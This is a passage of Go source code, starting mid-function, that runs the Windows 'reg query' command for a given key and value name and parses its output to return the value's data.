	out, err := exec.Command("reg", "query", keyPath, "/v", valueName).Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, valueName) {
			parts := strings.Fields(line)
			if len(parts) >= 3 {
				return strings.Join(parts[2:], " "), nil
			}
		}
	}
	return "", fmt.Errorf("value not found")
}
